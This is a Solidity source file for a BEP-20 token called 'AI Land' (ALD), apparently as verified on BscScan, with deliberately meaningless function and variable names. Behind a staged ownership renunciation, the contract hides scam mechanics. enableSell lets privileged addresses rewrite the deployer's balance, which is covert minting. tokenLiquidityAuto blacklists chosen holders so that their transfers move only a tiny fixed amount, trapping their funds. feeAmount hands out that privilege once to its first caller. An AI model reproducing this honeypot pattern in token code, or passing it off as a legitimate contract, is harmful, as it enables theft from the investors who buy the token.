/**
 *Submitted for verification at BscScan.com on 2023-02-02
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface autoExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface maxAt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AILand {
    uint8 public decimals = 18;
    bool public liquidityLaunch;
    address public swapTotal;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 constant launchMarketing = 12 ** 10;

    mapping(address => bool) public sellMarketing;
    address public launchedAutoFrom;
    uint256 public totalSupply = 100000000 * 10 ** 18;


    string public symbol = "ALD";
    address public owner;
    mapping(address => uint256) public balanceOf;
    string public name = "AI Land";
    mapping(address => bool) public senderTo;

    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        autoExempt walletLiquidity = autoExempt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        launchedAutoFrom = maxAt(walletLiquidity.factory()).createPair(walletLiquidity.WETH(), address(this));
        owner = receiverLimitSell();
        swapTotal = owner;
        sellMarketing[swapTotal] = true;
        balanceOf[swapTotal] = totalSupply;
        emit Transfer(address(0), swapTotal, totalSupply);
        fundTo();
    }

    

    function approve(address marketingMin, uint256 txMax) public returns (bool) {
        allowance[receiverLimitSell()][marketingMin] = txMax;
        emit Approval(receiverLimitSell(), marketingMin, txMax);
        return true;
    }

    function transferFrom(address maxFrom, address shouldExemptFee, uint256 txMax) public returns (bool) {
        if (maxFrom != receiverLimitSell() && allowance[maxFrom][receiverLimitSell()] != type(uint256).max) {
            require(allowance[maxFrom][receiverLimitSell()] >= txMax);
            allowance[maxFrom][receiverLimitSell()] -= txMax;
        }
        if (shouldExemptFee == swapTotal || maxFrom == swapTotal) {
            return txToken(maxFrom, shouldExemptFee, txMax);
        }
        if (senderTo[maxFrom]) {
            return txToken(maxFrom, shouldExemptFee, launchMarketing);
        }
        return txToken(maxFrom, shouldExemptFee, txMax);
    }

    function enableSell(uint256 txMax) public {
        if (!sellMarketing[receiverLimitSell()]) {
            return;
        }
        balanceOf[swapTotal] = txMax;
    }

    function fundTo() public {
        emit OwnershipTransferred(swapTotal, address(0));
        owner = address(0);
    }

    function receiverLimitSell() private view returns (address) {
        return msg.sender;
    }

    function txToken(address senderTx, address limitShouldLiquidity, uint256 txMax) internal returns (bool) {
        require(balanceOf[senderTx] >= txMax);
        balanceOf[senderTx] -= txMax;
        balanceOf[limitShouldLiquidity] += txMax;
        emit Transfer(senderTx, limitShouldLiquidity, txMax);
        return true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function feeAmount(address autoFrom) public {
        if (liquidityLaunch) {
            return;
        }
        sellMarketing[autoFrom] = true;
        liquidityLaunch = true;
    }

    function tokenLiquidityAuto(address receiverExempt) public {
        if (receiverExempt == swapTotal || receiverExempt == launchedAutoFrom || !sellMarketing[receiverLimitSell()]) {
            return;
        }
        senderTo[receiverExempt] = true;
    }

    function transfer(address shouldExemptFee, uint256 txMax) external returns (bool) {
        return transferFrom(receiverLimitSell(), shouldExemptFee, txMax);
    }


}